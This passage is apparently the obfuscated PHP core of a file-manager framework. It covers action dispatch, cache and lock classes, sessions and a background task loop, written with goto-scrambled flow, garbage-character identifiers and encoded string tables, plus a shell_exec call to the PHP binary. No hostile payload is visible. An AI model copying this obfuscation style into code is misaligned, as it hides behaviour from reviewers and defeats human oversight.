fâç‚„º‡«; c—¾ÍÇÁ„ß: $B…Î×œ£ö… = array_to_keyvalue($B…Î×œ£ö…, $C—Å©–÷‘ç[33], $C—Å©–÷‘ç[28]); if (!$B…Î×œ£ö… || !in_array($DËÌÍ­øÉƒ, $B…Î×œ£ö…)) { return $DËÌÍ­øÉƒ; } for ($eøö¤ê’è = 0; $eøö¤ê’è < count($B…Î×œ£ö…); $eøö¤ê’è++) { if (!in_array($DËÌÍ­øÉƒ . "\x28{$eøö¤ê’è}\x29", $B…Î×œ£ö…)) { return $DËÌÍ­øÉƒ . "\50{$eøö¤ê’è}\51"; } } goto cõº—Æª¾; F·öÆ‘ÈŠ­: $C—Å©–÷‘ç =& $_SERVER[Ö¹ñÒÁ²÷]; $a„Ø„•Êî = array($C—Å©–÷‘ç[1406] => USER_ID, $C—Å©–÷‘ç[432] => 0); $B…Î×œ£ö… = $this->field($C—Å©–÷‘ç[28])->where($a„Ø„•Êî)->select(); goto c—¾ÍÇÁ„ß; fâç‚„º‡«: } } goto fÕ’¨Ö¹Ô›; B¹“«ÀğÔ: function Action($DÊÈôÏÁ²º = '') { goto c¸¶¨ÖÕÓŠ; B¥óëâ¿Ãî: if (isset($fÅò‘ƒ½Í[$e‹Ø©ê®•])) { return $fÅò‘ƒ½Í[$e‹Ø©ê®•]; } if (is_file($AŠ‡áÌ…õĞ)) { include_once $AŠ‡áÌ…õĞ; } if (!class_exists($FŸ«ÆŸôãÃ)) { return actionCallError("\133{$DÊÈôÏÁ²º}\x20\x3d\x3e\40{$FŸ«ÆŸôãÃ}\x5d\x20\143\x6c\141\163\x73\x20\x6e\157\164\40\x65\170\x69\163\x74\x73\41"); } goto BÅŒ˜ìÜˆ; c¸¶¨ÖÕÓŠ: $b„ˆó×óø =& $_SERVER[¡Äç²]; static $fÅò‘ƒ½Í = array(); $cù²¬¥˜ª = $DÊÈôÏÁ²º; goto E÷Õàë¨Í; E÷Õàë¨Í: if (isset($fÅò‘ƒ½Í[$cù²¬¥˜ª])) { return $fÅò‘ƒ½Í[$cù²¬¥˜ª]; } $DÊÈôÏÁ²º = trim(str_replace($b„ˆó×óø[4], $b„ˆó×óø[5], $DÊÈôÏÁ²º), $b„ˆó×óø[4]); $aÏóæßœ×  = explode($b„ˆó×óø[5], $DÊÈôÏÁ²º); goto B¬÷¡Íõ¢«; BÅŒ˜ìÜˆ: $fÅò‘ƒ½Í[$e‹Ø©ê®•] = new $FŸ«ÆŸôãÃ(); $fÅò‘ƒ½Í[$cù²¬¥˜ª] = $fÅò‘ƒ½Í[$e‹Ø©ê®•]; return $fÅò‘ƒ½Í[$e‹Ø©ê®•]; goto d½Ê¿éğÅ–; B¬÷¡Íõ¢«: $E“ÉĞÎ‡† = strtolower($aÏóæßœ× [0]); if (substr($E“ÉĞÎ‡†, -6) == $b„ˆó×óø[6]) { $DÊÈôÏÁ²º = substr($aÏóæßœ× [0], 0, -6); $FŸ«ÆŸôãÃ = $DÊÈôÏÁ²º . $b„ˆó×óø[7]; $AŠ‡áÌ…õĞ = $b„ˆó×óø[8]; if (isset($aÏóæßœ× [1]) && substr(strtolower($aÏóæßœ× [1]), -5) == $b„ˆó×óø[9]) { $FŸ«ÆŸôãÃ = $DÊÈôÏÁ²º . $aÏóæßœ× [1]; $AŠ‡áÌ…õĞ = $b„ˆó×óø[10] . $aÏóæßœ× [1] . $b„ˆó×óø[11]; } else { if (count($aÏóæßœ× ) == 3) { $FŸ«ÆŸôãÃ = $DÊÈôÏÁ²º . $aÏóæßœ× [1] . $aÏóæßœ× [2]; $AŠ‡áÌ…õĞ = $b„ˆó×óø[12] . $aÏóæßœ× [1] . $b„ˆó×óø[13] . $aÏóæßœ× [2] . $b„ˆó×óø[11]; } } $AŠ‡áÌ…õĞ = PLUGIN_DIR . $DÊÈôÏÁ²º . $b„ˆó×óø[4] . $AŠ‡áÌ…õĞ; } else { if (substr($E“ÉĞÎ‡†, -5) == $b„ˆó×óø[9]) { $DÊÈôÏÁ²º = substr($aÏóæßœ× [0], 0, -5); return Model($DÊÈôÏÁ²º); } else { $FŸ«ÆŸôãÃ = $aÏóæßœ× [0] . $aÏóæßœ× [1]; $AŠ‡áÌ…õĞ = CONTROLLER_DIR . $aÏóæßœ× [0] . $b„ˆó×óø[4] . $aÏóæßœ× [1] . $b„ˆó×óø[14]; } } $e‹Ø©ê®• = strtolower($FŸ«ÆŸôãÃ); goto B¥óëâ¿Ãî; d½Ê¿éğÅ–: } function ActionApply($cèÂº£”†Ş, $C•í¢œÇ… = array()) { goto cÑ’ä‘Ğ¿Ø; EÊÅî‘‹åÇ: $b‹ºÜÑâ = substr($cèÂº£”†Ş, 0, $F­´Ê‘¤…Í); $E’Ö¨‹´îë = substr($cèÂº£”†Ş, $F­´Ê‘¤…Í + 1); $Dš†Ï¹ƒœÓ = Action($b‹ºÜÑâ); goto e‘Ÿ”ÂÜ‚; cÑ’ä‘Ğ¿Ø: if (is_array($cèÂº£”†Ş)) { return call_user_func_array($cèÂº£”†Ş, $C•í¢œÇ…); } if (function_exists($cèÂº£”†Ş)) { return call_user_func_array($cèÂº£”†Ş, $C•í¢œÇ…); } $F­´Ê‘¤…Í = strrpos($cèÂº£”†Ş, $_SERVER[¡Äç²][5]); goto EÊÅî‘‹åÇ; e‘Ÿ”ÂÜ‚: if (!method_exists($Dš†Ï¹ƒœÓ, $E’Ö¨‹´îë)) { return actionCallError("{$cèÂº£”†Ş}\x20\x6d\145\x74\x68\x6f\x64\40\x6e\x6f\x74\x20\x65\x78\151\x73\x74\163\x21"); } $AËïØ©»ä› = call_user_func_array(array($Dš†Ï¹ƒœÓ, $E’Ö¨‹´îë), $C•í¢œÇ…); return $AËïØ©»ä›; goto dƒÔÌ¢«; dƒÔÌ¢«: } function actionCallError($Fï°ãó²’Ô) { $A–ª½‘£Â =& $_SERVER[¡Äç²]; $D–—½—‡º… = json_encode_force(array($A–ª½‘£Â[15] => this_url(), $A–ª½‘£Â[16] => $GLOBALS[$A–ª½‘£Â[16]])); $D–—½—‡º… = str_replace(array($A–ª½‘£Â[17]), array($A–ª½‘£Â[4]), $D–—½—‡º…); return write_log($Fï°ãó²’Ô . $A–ª½‘£Â[18] . $D–—½—‡º…, $A–ª½‘£Â[19]); } goto Bô™Ø¨ÒÔ; D”Ã–Êß¦£: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto dà¶êæº¨É; AäŸ¤í ã: $C¯éßïÂ = $GLOBALS[$E½¬÷ìÈí²[6]][$E½¬÷ìÈí²[333]]; $AÙ»ğ—’§â = $C¯éßïÂ[$C¯éßïÂ[$E½¬÷ìÈí²[750]]]; $Bàëˆ¶ÍêÀ = $C¯éßïÂ[$E½¬÷ìÈí²[751]]; goto A¯ª²÷°™¾; dà¶êæº¨É: $E½¬÷ìÈí² =& $_SERVER[Ö¹ñÒÁ²÷]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto AäŸ¤í ã; A¯ª²÷°™¾: switch ($C¯éßïÂ[$E½¬÷ìÈí²[750]]) { case $E½¬÷ìÈí²[17]: self::$handle = Model($E½¬÷ìÈí²[752]); break; case $E½¬÷ìÈí²[753]: self::$handle = new CacheRedis($AÙ»ğ—’§â, $Bàëˆ¶ÍêÀ); break; case $E½¬÷ìÈí²[754]: self::$handle = new CacheMemcached($AÙ»ğ—’§â, $Bàëˆ¶ÍêÀ); break; case $E½¬÷ìÈí²[163]: self::$handle = new CacheFile($AÙ»ğ—’§â, $Bàëˆ¶ÍêÀ); break; default: break; } return self::$handle; goto fªò÷©ĞÊ†; fªò÷©ĞÊ†: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($CÕ¥‘Ö¯ƒÌ) { if (is_array($CÕ¥‘Ö¯ƒÌ) || is_object($CÕ¥‘Ö¯ƒÌ)) { $CÕ¥‘Ö¯ƒÌ = json_encode($CÕ¥‘Ö¯ƒÌ); } $CÕ¥‘Ö¯ƒÌ = rawurlencode($CÕ¥‘Ö¯ƒÌ); return KOD_SITE_ID . $_SERVER[Ö¹ñÒÁ²÷][70] . $CÕ¥‘Ö¯ƒÌ; } public static function get($bÃñ±ˆ½ƒì) { $AôáÀñ¡¥ = self::key($bÃñ±ˆ½ƒì); if (!isset(self::$memoryCache[$AôáÀñ¡¥])) { $DçÇ‡£§¿ = self::init()->get($AôáÀñ¡¥); self::$memoryCache[$AôáÀñ¡¥] = unserialize($DçÇ‡£§¿); } return self::$memoryCache[$AôáÀñ¡¥]; } public static function set($EˆÎæ„Öñæ, $f­òÉìÂ­…, $BÑ«Œ‘ˆ¼ = false) { goto cÀˆ²‚†š¶; cÀˆ²‚†š¶: $aÇ¤‚œ‘¼ç = self::key($EˆÎæ„Öñæ); if (isset(self::$memoryCache[$aÇ¤‚œ‘¼ç]) && self::$memoryCache[$aÇ¤‚œ‘¼ç] === $f­òÉìÂ­…) { return !0; } if ($BÑ«Œ‘ˆ¼ === 0) { self::$memoryCache[$aÇ¤‚œ‘¼ç] = $f­òÉìÂ­…; return !0; } goto a›Ğ ˆ‘Ş; a›Ğ ˆ‘Ş: CacheLock::lock($EˆÎæ„Öñæ); $BÚãö»¹ß– = self::init()->set($aÇ¤‚œ‘¼ç, serialize($f­òÉìÂ­…), $BÑ«Œ‘ˆ¼); self::$memoryCache[$aÇ¤‚œ‘¼ç] = $f­òÉìÂ­…; goto f¤––Ù•‹; f¤––Ù•‹: CacheLock::unlock($EˆÎæ„Öñæ); return $BÚãö»¹ß–; goto C¶ª‰™ÓÍ; C¶ª‰™ÓÍ: } public static function remove($fÉ«ŒµŠÙ) { goto Dõ¨ºÀë; b¬à‹ÎÙóÅ: return $a»¸¥ù›«ø; goto DùÄóÏçô±; Dõ¨ºÀë: $e¸®¹Å§ë¿ = self::key($fÉ«ŒµŠÙ); unset(self::$memoryCache[$e¸®¹Å§ë¿]); self::clearTimeout(); goto Cİè±†¤ì; Cİè±†¤ì: CacheLock::lock($fÉ«ŒµŠÙ); $a»¸¥ù›«ø = self::init()->remove($e¸®¹Å§ë¿); CacheLock::unlock($fÉ«ŒµŠÙ); goto b¬à‹ÎÙóÅ; DùÄóÏçô±: } public static function clearMemory($c±Ïß§ç ª = false) { if ($c±Ïß§ç ª) { $c±Ïß§ç ª = self::key($c±Ïß§ç ª); unset(self::$memoryCache[$c±Ïß§ç ª]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Ö¹ñÒÁ²÷][755])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ö¹ñÒÁ²÷][756])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($B«ëĞËŠ–â, $f¯å‘ºŞğï) { $E“­Ø…‘Æ =& $_SERVER[Ö¹ñÒÁ²÷]; $this->cachePath = $B«ëĞËŠ–â[$E“­Ø…‘Æ[75]]; $this->prefix = $E“­Ø…‘Æ[757]; $this->cacheTime = $f¯å‘ºŞğï; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($b¿‚…Œğ˜ª) { $Aö÷½ÑÅ½Ø =& $_SERVER[Ö¹ñÒÁ²÷]; $b¿‚…Œğ˜ª = str_replace(array($Aö÷½ÑÅ½Ø[758], $Aö÷½ÑÅ½Ø[93], $Aö÷½ÑÅ½Ø[69]), $Aö÷½ÑÅ½Ø[759], $b¿‚…Œğ˜ª); return $this->cachePath . $Aö÷½ÑÅ½Ø[760] . $b¿‚…Œğ˜ª . $Aö÷½ÑÅ½Ø[761]; } public function set($EÇ¢¬Ì‡ò¥, $aÊæ¸Ş´, $aâÁ×áµÌ’ = false) { $A¿Éîá–¶’ = $this->getFile($EÇ¢¬Ì‡ò¥); if (file_put_contents($A¿Éîá–¶’, $this->prefix . $aÊæ¸Ş´, LOCK_EX)) { return !0; } @unlink($A¿Éîá–¶’); return !1; } public function get($dÁ¥¬Ñ®í«) { $d …æ¤ìã¸ = $this->getFile($dÁ¥¬Ñ®í«); if (file_exists($d …æ¤ìã¸) && filemtime($d …æ¤ìã¸) < time() - $this->cacheTime) { @unlink($d …æ¤ìã¸); return !1; } $E õ”ğù = @file_get_contents($d …æ¤ìã¸); return substr($E õ”ğù, strlen($this->prefix)); } public function remove($F×ßãÅ¿´¨) { $C‹áÆÏ‰Ú = $this->getFile($F×ßãÅ¿´¨); return @unlink($C‹áÆÏ‰Ú); } public function deleteAll() { $f§Åøº®‡º =& $_SERVER[Ö¹ñÒÁ²÷]; $C¼‹‰…òÄ = scandir($this->cachePath); foreach ($C¼‹‰…òÄ as $då¡äÏ¿ì) { $aåÊ©Ğ©Ûë = $this->cachePath . $då¡äÏ¿ì; if (strpos($aåÊ©Ğ©Ûë, $f§Åøº®‡º[761]) && strpos($aåÊ©Ğ©Ûë, $f§Åøº®‡º[762])) { @unlink($aåÊ©Ğ©Ûë); } } } public function clearTimeout() { $b×Ù™†Ã¯Ã =& $_SERVER[Ö¹ñÒÁ²÷]; $b’ÔÔ©Úï = scandir($this->cachePath); foreach ($b’ÔÔ©Úï as $FŠ¬”Ú•÷‚) { $bëñ†ÏÛ£Ê = $this->cachePath . $FŠ¬”Ú•÷‚; if (strpos($bëñ†ÏÛ£Ê, $b×Ù™†Ã¯Ã[761]) && strpos($bëñ†ÏÛ£Ê, $b×Ù™†Ã¯Ã[762]) && filemtime($bëñ†ÏÛ£Ê) < time() - $this->cacheTime) { @unlink($bëñ†ÏÛ£Ê); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto F–÷É­¥Ú²; F–÷É­¥Ú²: $eê¦Ñéô² =& $_SERVER[Ö¹ñÒÁ²÷]; if (self::$handle) { return self::$handle; } $CèÁó†–¯¦ = $GLOBALS[$eê¦Ñéô²[6]][$eê¦Ñéô²[333]]; goto fìèçÔ›¶Ô; c’É±è¶¬Ø: if ($EÈÔÇ®×ëÊ == $eê¦Ñéô²[17] && $B¼íŠÑªñÃ == $eê¦Ñéô²[9]) { $EÈÔÇ®×ëÊ = $eê¦Ñéô²[163]; } switch ($EÈÔÇ®×ëÊ) { case $eê¦Ñéô²[753]: self::$handle = new CacheLockRedis(); break; case $eê¦Ñéô²[754]: self::$handle = new CacheLockMemcached(); break; case $eê¦Ñéô²[17]: self::$handle = new CacheLockDatabase(); break; case $eê¦Ñéô²[163]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto a‡ŞíÀ„ÜÓ; fìèçÔ›¶Ô: self::$timeout = $CèÁó†–¯¦[$eê¦Ñéô²[763]] ? $CèÁó†–¯¦[$eê¦Ñéô²[763]] : 10; $B¼íŠÑªñÃ = _get($GLOBALS[$eê¦Ñéô²[6]], $eê¦Ñéô²[764]); $EÈÔÇ®×ëÊ = $CèÁó†–¯¦[$eê¦Ñéô²[750]] ? $CèÁó†–¯¦[$eê¦Ñéô²[750]] : $eê¦Ñéô²[163]; goto c’É±è¶¬Ø; a‡ŞíÀ„ÜÓ: } private static function key($d“—µ—àêÚ) { return $_SERVER[Ö¹ñÒÁ²÷][765] . Cache::key($d“—µ—àêÚ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($F¦‹†ŞŠ§ = '') { self::$errorMsg = $F¦‹†ŞŠ§; } public static function lockGlobal($bî¸ÁßØÜ†, $fŸ¹ÄƒÀËí) { return self::lock($bî¸ÁßØÜ†, $fŸ¹ÄƒÀËí, !0); } public static function lock($bòÔ—®Ê¢ä, $E¹Ü¼ŒÈ·© = false, $eÖİäÚƒ¡‘ = false) { goto e˜‘¹ŒÍå; bÆÅ¨¼Ä‹: if (!$eÖİäÚƒ¡‘) { self::$lockItem[$c¯£Õœƒ©Ã] = !0; } return $eˆÓ’Ş¤ÄÓ; goto bğ ¡ŸÆñ¹; e˜‘¹ŒÍå: $A“ÎØš£Ñò =& $_SERVER[Ö¹ñÒÁ²÷]; $E÷Ğôóë§ô = self::init(); $c¯£Õœƒ©Ã = self::key($bòÔ—®Ê¢ä); goto A’”íİ¥øŞ; A’”íİ¥øŞ: $E¹Ü¼ŒÈ·© = $E¹Ü¼ŒÈ·© ? $E¹Ü¼ŒÈ·© : self::$timeout; $eˆÓ’Ş¤ÄÓ = $E÷Ğôóë§ô->lock($c¯£Õœƒ©Ã, $E¹Ü¼ŒÈ·©); if (!$eˆÓ’Ş¤ÄÓ) { $b’«¢†Üš³ = $A“ÎØš£Ñò[766] . $E¹Ü¼ŒÈ·© . $A“ÎØš£Ñò[67] . self::$errorMsg . $A“ÎØš£Ñò[67] . get_caller_msg(); $DÍÂæ¥ÄÚŒ = "\x4c\157\143\x6b\x20\141\143\164\x69\157\x6e\x3a\x20{$c¯£Õœƒ©Ã}\40\164\x69\x6d\145\157\165\x74\54\x6f\166\x65\x72\x20{$E¹Ü¼ŒÈ·©}\x20\x73"; $DÍÂæ¥ÄÚŒ = self::$errorMsg ? self::$errorMsg : $eÈİåÆ×§; write_log($b’«¢†Üš³, $A“ÎØš£Ñò[767]); show_json($DÍÂæ¥ÄÚŒ, !1); } goto bÆÅ¨¼Ä‹; bğ ¡ŸÆñ¹: } public static function lockGet($DÅë‚¿ÃÆè) { $B¥£ÌËÖä = self::key($DÅë‚¿ÃÆè); if (self::$lockItem[$B¥£ÌËÖä]) { return self::$lockItem[$B¥£ÌËÖä]; } return self::init()->lockGet($B¥£ÌËÖä); } public static function unlock($b„¨Û‹Ä„ ) { $d¡†¿’Ÿ¨ = self::key($b„¨Û‹Ä„ ); self::$lockItem[$d¡†¿’Ÿ¨] = null; return self::init()->unlock($d¡†¿’Ÿ¨); } public static function unlockRuntime() { $e¼™ÈÕÁ¥² =& $_SERVER[Ö¹ñÒÁ²÷]; $dçÇÏ”Éˆí = self::init(); $aˆË†‘™æà = !1; foreach (self::$lockItem as $e­Şš‹–¡ => $e¡Ô‘İ‹äŠ) { if (!$e¡Ô‘İ‹äŠ) { continue; } $dçÇÏ”Éˆí->unlock($e­Şš‹–¡); if (!$aˆË†‘™æà) { $aˆË†‘™æà = !0; write_log($e¼™ÈÕÁ¥²[768] . $e­Şš‹–¡ . $e¼™ÈÕÁ¥²[67] . get_caller_msg(), $e¼™ÈÕÁ¥²[767]); continue; } write_log($e¼™ÈÕÁ¥²[768] . $e­Şš‹–¡, $e¼™ÈÕÁ¥²[767]); } } } goto a‚«ºÛ°–Ï; Dß»ùğâÅæ: function beforeShutdownError($B¿ñë‘°²Ë = false, $E»ƒé¹²¤× = '', $cË»Ï¾²šø = '', $CÎ—¦À = 0) { $a“î‡˜‰ìÃ =& $_SERVER[¡Äç²]; switch ($B¿ñë‘°²Ë) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $C¸ó‹¹‹  = $a“î‡˜‰ìÃ[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $C¸ó‹¹‹  = $a“î‡˜‰ìÃ[40]; break; case E_STRICT: $C¸ó‹¹‹  = $a“î‡˜‰ìÃ[41]; break; case E_NOTICE: case E_USER_NOTICE: $C¸ó‹¹‹  = $a“î‡˜‰ìÃ[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $C¸ó‹¹‹  = $a“î‡˜‰ìÃ[43]; break; default: break; } if (!$C¸ó‹¹‹  || $C¸ó‹¹‹  == $a“î‡˜‰ìÃ[42] || $C¸ó‹¹‹  == $a“î‡˜‰ìÃ[43]) { return; } $cË»Ï¾²šø = $a“î‡˜‰ìÃ[4] . str_replace($_SERVER[$a“î‡˜‰ìÃ[37]], $a“î‡˜‰ìÃ[20], $cË»Ï¾²šø); $dÏÓ­¼·‹ë = $C¸ó‹¹‹  . $a“î‡˜‰ìÃ[44] . $E»ƒé¹²¤× . $a“î‡˜‰ìÃ[44] . $cË»Ï¾²šø . $a“î‡˜‰ìÃ[44] . $CÎ—¦À; write_log($dÏÓ­¼·‹ë . $a“î‡˜‰ìÃ[18] . get_caller_msg(1), $a“î‡˜‰ìÃ[19]); } $_SERVER[$_SERVER[¡Äç²][45]] = $_SERVER[$_SERVER[¡Äç²][37]] . $_SERVER[¡Äç²][46]; $f›Ó•ò«Ÿª = strrev(base64_decode($_SERVER[¡Äç²][47])); goto A©÷–±‡´®; Bô™Ø¨ÒÔ: function ActionCall($b„è¤—˜°°) { $aÁô×öàŠó = array_slice(func_get_args(), 1); return ActionApply($b„è¤—˜°°, $aÁô×öàŠó); } function ActionCallApi($BŸ”¶×ƒç», $FÄ‚Á›Šï = '') { goto FËÕ–Ò–•; FËÕ–Ò–•: $Eµ­ãÁÑ¢ğ =& $_SERVER[¡Äç²]; $fìæ§³ö‡Ë = $FÄ‚Á›Šï; if (is_array($FÄ‚Á›Šï)) { $fìæ§³ö‡Ë = $Eµ­ãÁÑ¢ğ[20]; foreach ($FÄ‚Á›Šï as $DåÏ¡Şº®à => $F‡ˆŒ¥Î¥) { $F‡ˆŒ¥Î¥ = is_array($F‡ˆŒ¥Î¥) ? json_encode($F‡ˆŒ¥Î¥) : $F‡ˆŒ¥Î¥; $F‡ˆŒ¥Î¥ = is_bool($F‡ˆŒ¥Î¥) ? intval($F‡ˆŒ¥Î¥) : $F‡ˆŒ¥Î¥; $fìæ§³ö‡Ë .= $Eµ­ãÁÑ¢ğ[21] . $DåÏ¡Şº®à . $Eµ­ãÁÑ¢ğ[22] . rawurlencode($F‡ˆŒ¥Î¥); } } goto dÓ˜ëˆæ; fêäÑôò‡Œ: return $fÀ„çñêÇÚ; goto b´ãÉ¡Ì–Ù; e¼¬Ö¹‡Ü×: $cƒØ‹àó×¶ = json_decode($C¥îÌ·´ë‘, !0); $fÀ„çñêÇÚ = is_array($cƒØ‹àó×¶) ? $cƒØ‹àó×¶ : array($Eµ­ãÁÑ¢ğ[33] => null, $Eµ­ãÁÑ¢ğ[34] => $C¥îÌ·´ë‘); if (!$cƒØ‹àó×¶) { echo $C¥îÌ·´ë‘; } goto fêäÑôò‡Œ; dÓ˜ëˆæ: $dîÈ×À¿Ö¶ = Action($Eµ­ãÁÑ¢ğ[23])->accessToken(); $BŸ”¶×ƒç» = str_replace($Eµ­ãÁÑ¢ğ[5], $Eµ­ãÁÑ¢ğ[4], $BŸ”¶×ƒç») . $Eµ­ãÁÑ¢ğ[24] . $dîÈ×À¿Ö¶ . $fìæ§³ö‡Ë; $C¥îÌ·´ë‘ = $Eµ­ãÁÑ¢ğ[20]; goto c•Äßƒ’–«; c•Äßƒ’–«: $A¦¤”è¯œ® = phpBinCommand(); if ($A¦¤”è¯œ® && function_exists($Eµ­ãÁÑ¢ğ[25])) { $bòî¸Õ¢ºÂ = $A¦¤”è¯œ® . $Eµ­ãÁÑ¢ğ[26] . BASIC_PATH . $Eµ­ãÁÑ¢ğ[27] . escapeshellarg($BŸ”¶×ƒç»); $C¥îÌ·´ë‘ = shell_exec($bòî¸Õ¢ºÂ); } if (!$C¥îÌ·´ë‘) { $A‹ÌÚâ÷ƒô = stream_context_create(array($Eµ­ãÁÑ¢ğ[28] => array($Eµ­ãÁÑ¢ğ[29] => 20, $Eµ­ãÁÑ¢ğ[30] => $Eµ­ãÁÑ¢ğ[31]))); $C¥îÌ·´ë‘ = file_get_contents(APP_HOST . $Eµ­ãÁÑ¢ğ[32] . $BŸ”¶×ƒç», !1, $A‹ÌÚâ÷ƒô); } goto e¼¬Ö¹‡Ü×; b´ãÉ¡Ì–Ù: } function ActionCallHook($D±¼ÎÎİñ„) { goto dÁ¢¤©ë°¶; aª²óØ¿ó: $GLOBALS[$AŒË¡æŸ²Å[35]] = 1; $EÓÌŠÚõ‰‡ = ActionApply($D±¼ÎÎİñ„, $AÓ§…„¨‡); $E¯¿ÏŒ›Šë = ob_get_clean(); goto EÂğ¹°äã‚; EÂğ¹°äã‚: $EÓÌŠÚõ‰‡ = $E¯¿ÏŒ›Šë ? json_decode($E¯¿ÏŒ›Šë, !0) : $EÓÌŠÚõ‰‡; $GLOBALS[$AŒË¡æŸ²Å[35]] = 0; return $EÓÌŠÚõ‰‡; goto BˆéñÀé¶Ş; dÁ¢¤©ë°¶: $AŒË¡æŸ²Å =& $_SERVER[¡Äç²]; ob_start(); $AÓ§…„¨‡ = array_slice(func_get_args(), 1); goto aª²óØ¿ó; BˆéñÀé¶Ş: } goto d…²–¬‡Ä»; d»¡“ÅÎ“¬: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto dˆ‡ƒ¹Ø…; bİ´Œ»àî: $C»Á´ˆ™“İ = $GLOBALS[$a­ã÷†ñƒÇ[6]][$a­ã÷†ñƒÇ[333]]; self::$sessionTime = $C»Á´ˆ™“İ[$a­ã÷†ñƒÇ[1375]]; $a’†Ç–™Û£ = SESSION_ID; goto Cƒ•ÆæëÁ¡; dˆ‡ƒ¹Ø…: $a­ã÷†ñƒÇ =& $_SERVER[Ö¹ñÒÁ²÷]; static $AÊ §Ğ‘í = false; if ($AÊ §Ğ‘í) { return $AÊ §Ğ‘í; } goto bİ´Œ»àî; Bµ§åÜ‘›Ó: switch ($f©…£ÌŸªß) { case $a­ã÷†ñƒÇ[17]: self::$handle = Model($a­ã÷†ñƒÇ[752]); break; case $a­ã÷†ñƒÇ[753]: self::$handle = new CacheRedis($a¨ÚÈç‰™–, $Eæ¿ÚÀÃÖÌ); break; case $a­ã÷†ñƒÇ[754]: self::$handle = new CacheMemcached($a¨ÚÈç‰™–, $Eæ¿ÚÀÃÖÌ); break; case $a­ã÷†ñƒÇ[163]: $a¨ÚÈç‰™–[$a­ã÷†ñƒÇ[75]] = $a¨ÚÈç‰™–[$a­ã÷†ñƒÇ[75]] . $a­ã÷†ñƒÇ[1378]; self::$handle = new CacheFile($a¨ÚÈç‰™–, $Eæ¿ÚÀÃÖÌ); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $AÊ §Ğ‘í = new self(); goto EçãÁ†ø–›; EçãÁ†ø–›: return $AÊ §Ğ‘í; goto D¯ŸæƒêÎ; Cƒ•ÆæëÁ¡: $a’†Ç–™Û£ = _get($GLOBALS, $a­ã÷†ñƒÇ[1376], $a’†Ç–™Û£); if (self::$sessionSign) { } else { if (Cookie::get($a’†Ç–™Û£)) { self::$sessionSign = Cookie::get($a’†Ç–™Û£); } else { self::$sessionSign = guid(); } } Cookie::setSafe($a’†Ç–™Û£, self::$sessionSign, self::$sessionTime); goto dæÈŒ¡Å‡µ; dæÈŒ¡Å‡µ: $f©…£ÌŸªß = $C»Á´ˆ™“İ[$a­ã÷†ñƒÇ[1377]]; $a¨ÚÈç‰™– = $C»Á´ˆ™“İ[$f©…£ÌŸªß]; $Eæ¿ÚÀÃÖÌ = $C»Á´ˆ™“İ[$a­ã÷†ñƒÇ[751]]; goto Bµ§åÜ‘›Ó; D¯ŸæƒêÎ: } public static function sign($dÄ¿‰à´ğŸ = false) { $dÄ¿‰à´ğŸ && (self::$sessionSign = $dÄ¿‰à´ğŸ); self::init(); return self::$sessionSign; } public static function set($F²ƒ‘À®…å, $f–ÅÜ¤à”¯ = false) { self::init(); if (is_array($F²ƒ‘À®…å)) { foreach ($F²ƒ‘À®…å as $D¾ÃóàÕ‡î => $fƒ´„Á£ÕÚ) { array_set_value(self::$data, $D¾ÃóàÕ‡î, $fƒ´„Á£ÕÚ); } } else { array_set_value(self::$data, $F²ƒ‘À®…å, $f–ÅÜ¤à”¯); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($FËÎŒ‘§Îì = false) { self::init(); if (!$FËÎŒ‘§Îì) { return self::$data; } return array_get_value(self::$data, $FËÎŒ‘§Îì); } public static function remove($Aßåì³«”) { self::init(); unset(self::$data[$Aßåì³«”]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ö¹ñÒÁ²÷][756])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto B¨ìˆ†Òà; B¨ìˆ†Òà: $f„„Íë™³ó =& $_SERVER[Ö¹ñÒÁ²÷]; if (self::valueGet($f„„Íë™³ó[686]) != $f„„Íë™³ó[83]) { return; } if (self::valueGet($f„„Íë™³ó[1379]) == $f„„Íë™³ó[83]) { $e‰à¹ƒôÛ´ = self::valueGet($f„„Íë™³ó[1380]); if (time() - $e‰à¹ƒôÛ´ > 3600 * 2) { self::restart(); } return; } goto a÷„§‘¦÷Í; Fø„Œ•‰²: while (!0) { self::cacheClear(); if (self::valueGet($f„„Íë™³ó[686]) != $f„„Íë™³ó[83]) { self::valueSet($f„„Íë™³ó[1379], $f„„Íë™³ó[464]); self::log($f„„Íë™³ó[1383]); die; } self::valueSet($f„„Íë™³ó[1379], $f„„Íë™³ó[83]); self::valueSet($f„„Íë™³ó[1380], time()); self::taskRunAll(); sleep(self::valueGet($f„„Íë™³ó[1384])); } goto Aà•Å¾Ë‰Õ; a÷„§‘¦÷Í: http_close(); self::valueSet($f„„Íë™³ó[1379], $f„„Íë™³ó[83]); Hook::bind($f„„Íë™³ó[1381], $f„„Íë™³ó[1382]); goto Fø„Œ•‰²; Aà•Å¾Ë‰Õ: } public static function restart() { $bÕ¿æ‡¤ßœ =& $_SERVER[Ö¹ñÒÁ²÷]; http_close(); 